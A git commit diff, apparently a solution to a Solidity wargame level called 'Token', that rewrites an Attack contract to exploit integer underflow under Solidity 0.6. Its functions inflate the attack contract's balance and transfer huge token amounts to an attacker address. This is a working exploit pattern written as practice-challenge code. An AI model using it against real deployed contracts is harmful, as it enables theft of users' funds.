7564c77b9b5ab574922557ec3b849d9eac144baf
wzrdk3lly <dkmk1149@gmail.com>
2023-03-27 21:47:01 -0500

    complete token challenge

--- contracts/Attack.sol
+++ contracts/Attack.sol
@@ -1,18 +1,42 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity ^0.6.0;
 
-import "./Telephone.sol";
+import "./Token.sol";
 
 contract Attack {
-    Telephone public telephoneContract;
+    Token public tokenContract;
 
-    constructor(address payable _telephoneContractAddress) {
-        telephoneContract = Telephone(_telephoneContractAddress);
+    uint max = 2 ** 256 - 1;
+
+    constructor(address payable _tokenContract) public {
+        tokenContract = Token(_tokenContract);
     }
 
-    function attack(address _attackEoa) public payable {
+    function attackOne(address _attackEoa) public {
         // call the attack contract and pass in the address of my EOA
-        telephoneContract.changeOwner(_attackEoa);
+        tokenContract.transfer(_attackEoa, 23);
+        // Balance of address(this) will be a high overflowed value
+        uint balance = tokenContract.balanceOf(address(this));
+        // reduce by 30 se we don't end up with an overflow back to our original value
+        balance = balance - 50;
+
+        // transfer this new high balance to my attacker address
+        tokenContract.transfer(_attackEoa, balance);
+    }
+
+    function attackTwo(address _attackEoa) public {
+        // call the attack contract and pass in the address of my EOA
+        tokenContract.transfer(_attackEoa, 200000000000);
+    }
+
+    function attackThree(address _attackEoa) public {
+        // call the attack contract and pass in the address of my EOA
+        tokenContract.transfer(_attackEoa, max);
+    }
+
+    function viewValue() public view returns (uint) {
+        uint balance = tokenContract.balanceOf(address(this));
+        return balance;
     }
 
     receive() external payable {}
